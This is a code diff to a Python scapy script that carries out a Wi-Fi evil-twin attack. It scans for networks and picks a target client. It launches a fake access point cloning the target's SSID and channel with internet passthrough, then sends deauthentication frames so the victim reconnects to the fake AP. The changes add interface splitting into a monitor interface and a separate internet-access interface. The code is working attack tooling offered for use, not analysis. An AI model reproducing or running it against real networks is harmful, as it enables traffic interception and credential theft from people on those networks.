@@ -1,3 +1,4 @@
+from itertools import count
 from scapy.all import *
 from threading import Thread
 import pandas
@@ -88,9 +89,32 @@ if __name__ == "__main__":
     print("Interfaces:")
     for (i, item) in enumerate(interfaces, start=1):
         print("   " + str(i) + ". " + item)
+    val = input("Please Choose Interface for Dividing (Optinal), otherwise enter -1: ")
+
+    # 2. Choose card interface to split for 2 different interfaces
+    flag_div = True
+    while True:
+        try:
+            choose = int(val)
+            if choose == -1:
+                flag_div = False
+                break
+            interface = interfaces[choose - 1]
+            enable_monitor_mode(interface)
+            os.system(f"sudo iw dev {interface} interface add mon0 type monitor")
+            os.system(f"sudo ifconfig mon0 up")
+            break
+        except:
+            val = input("Please Choose Again: ")
+    
+    
+    interfaces = os.listdir('/sys/class/net/')
+    print("Interfaces:")
+    for (i, item) in enumerate(interfaces, start=1):
+        print("   " + str(i) + ". " + item)
     val = input("Please Choose Interface for Attack: ")
 
-    # 2. Choose card interface to attack with
+    # 2.1 Choose card interface to attack with
     while True:
         try:
             choose = int(val)
@@ -98,17 +122,28 @@ if __name__ == "__main__":
             break
         except:
             val = input("Please Choose Again: ")
-    
+    val2 = input("Please Choose Interface for Fake AP: ")
 
-    val2 = input("Please Choose Interface for Creating Fake AP: ")
-
-    # 2.1. Choose card interface to create Fake AP with
+    # 2.2. Choose card interface to create Fake AP with
     while True:
         try:
             if val2 == val:
                 raise Exception()
             choose = int(val2)
             interface_fake = interfaces[choose - 1]
+            break
+        except:
+            val = input("Please Choose Again: ")
+
+    val3 = input("Please Choose Interface for Internet Access of the Fake AP: ")
+
+    # 2.3. Choose card interface to give internet access for the Fake AP 
+    while True:
+        try:
+            if val3 == val or val3 == val2:
+                raise Exception()
+            choose = int(val3)
+            interface_internet = interfaces[choose - 1]
             break
         except:
             val = input("Please Choose Again: ")
@@ -125,7 +160,7 @@ if __name__ == "__main__":
     channel_changer.start()
 
     # 5. Start sniffing (Synchronous process)
-    sniff(prn=callback, iface=interface, timeout=10)
+    sniff(prn=callback, iface=interface, timeout=15)
 
     # 6. Stop changing channel thread
     stop_threads = True
@@ -178,7 +213,13 @@ if __name__ == "__main__":
         i += 1
    
           
-    # 12. User attack
+    # 12. Fake AP
+    fake_ap_cmd = 'sudo gnome-terminal -- sh -c "python3 fakeAP.py ' + \
+    net['SSID'] + ' ' + str(net['Channel']) + ' ' + interface_internet+' '+ interface_fake+';"$SHELL'
+    print(fake_ap_cmd)
+    os.system(fake_ap_cmd)
+    
+    # 13. User attack
     # Source: https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy
     print('The target is: ', target_mac)
     print('Attack!!! :)')
@@ -187,19 +228,14 @@ if __name__ == "__main__":
     deauth1 = threading.Thread(target = for_ap, args = (frame, interface))
     deauth2 = threading.Thread(target = for_client, args = (frame1, interface))
 
-    # 13. Fake AP
-    fake_ap_cmd = 'sudo gnome-terminal -- sh -c "python3 fakeAP.py ' + \
-    net['SSID'] + ' ' + str(net['Channel']) + ' ' + interface_fake+' '+ interface+';"$SHELL'
-    os.system(fake_ap_cmd)
+    deauth1.start()
+    deauth2.start()
+    deauth1.join()
+    deauth2.join()
 
-    # 14. Deauth
-    try:
-        deauth1.start()
-        deauth2.start()
-        deauth1.join()
-        deauth2.join()
-    except:
-       print("@@@@@@@@@@@@@@@@@@@@")
-    # 15. Disable monitor mode
+
+    # 14. Disable monitor mode and cancel interface division
     disable_monitor_mode(interface)
     disable_monitor_mode(interface_fake)
+    if flag_div: 
+        os.system(f"iw dev mon0 {interface} del")
